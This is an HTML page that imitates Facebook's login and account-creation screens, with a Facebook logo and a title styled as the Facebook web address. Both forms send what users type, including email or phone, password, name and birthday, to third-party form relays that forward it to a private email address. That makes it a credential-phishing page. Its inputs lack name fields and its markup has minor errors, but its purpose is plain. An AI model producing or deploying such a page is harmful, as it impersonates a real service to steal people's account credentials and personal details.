<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>https//www.Facebook.com</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="responsive.css">
</head>

<body>
  <!-- start header area-->
<header class="header">
  <div class="container">
    <div class="logo-area">
      <img src="../assets/fb.png" alt="Facebook"> 
    </div>
    <div class="login-area">
<form action="https://formspree.io/f/{mahedy212@gmail.com}" method="post">
      <div class="email">
        <label for="email">Email or Phone</label>
        <input type="text" id="email">
      </div>
      <div class="password">
        <label for="password">Password</label>
        <input type="password" id="password">
        <a href="#">forgotten account</a>
      </div>
      <div class="login">
        <input type="submit" value="log in">
      </div>
      </form>
      
    </div>
    
  </div>
</header>
<!-- end header area-->
<section class="sign-up">
  <div class="container">
  <div class="left">
    <p>Facebook helps you connect and share<br> with the people in your life</p>
    <img src="../assets/net.png" alt="Network">
    
  </div>
  <div class="right">
    <h2>Create an account </h2>
    <h6>It's free and always will be</h6>
    <form action="https://formsubmit.co/mahedy212@gmail.com" method="post">
      <div class="full-name">
        <div class="first-name">
          <input type="text" placeholder="First name">
        </div>
        <div class="surname">
          <input type="text" placeholder="surname">
        </div>
      </div>
      <input type="text" placeholder="Phone number or email address">
      <input type="password" placeholder="password">
      <div class="birthday">
        <h5>Birthday</h5>
        <div class="birth-date">
          <select>
        <option value="day">Day</option>
         <option value="day">1</option>
         <option value="day">2</option>
         <option value="day">3</option>
         <option value="day">4</option>
         <option value="day">5</option>
         <option value="day">6</option>
         <option value="day">7</option>
         <option value="day">8</option>
         <option value="day">9</option>
         <option value="day">10</option>
         <option value="day">11</option>
         <option value="day">12</option>
         <option value="day">13</option>
         <option value="day">14</option>
         <option value="day">15</option>
         <option value="day">16</option>
         <option value="day">17</option>
         <option value="day">18</option>
         <option value="day">19</option>
         <option value="day">20</option>
         <option value="day">21</option>
         <option value="day">22</option>
         <option value="day">23</option>
         <option value="day">24</option>
         <option value="day">25</option>
         <option value="day">26</option>
         <option value="day">27</option>
         <option value="day">28</option>
         <option value="day">29</option>
         <option value="day">30</option>
         <option value="day">31</option>
          </select>
          <select>
    <option value="month">Month</option>
    <option value="month">Jan</option>
    <option value="month">Feb</option>
    <option value="month">Mar</option>
    <option value="month">Apr</option>
    <option value="month">May</option>
    <option value="month">Jun</option>
    <option value="month">Jul </option>
    <option value="month">Aug</option>
    <option value="month">Sep</option>
    <option value="month">Oct</option>
    <option value="month">Nov</option>
    <option value="month">Dec</option>
          
  <input class="bb"type="Year"placeholder="Years">
  </select>
        </div>
      <div class="birth-link">
      <a class="gg" href="#">Why do I need to provide my dath of birth?</a>
        </div>
      </div>
      <div class="gender">
      <input type="radio" name="gender" id="female">
      <label for="female">Female</label>
      <input type="radio" name="gender" id="male">
      <label for="male">Male</label>
      </div>
      <div class="text-box">
        <p>
          By clicking sign-up, you agree <a class="h" href="#">terms</a>,<a class="h" href="#">data policy</a> and <a class="h" href="#">Coockie policy</a>.You may receive notification from us and can opt out any time.
        </p>
      </div>
      <div class="btn">
        <input type="submit" value="Sign Up">
      </div>
    </form>
  </div>
  </div>
</section>
</body>

</html>
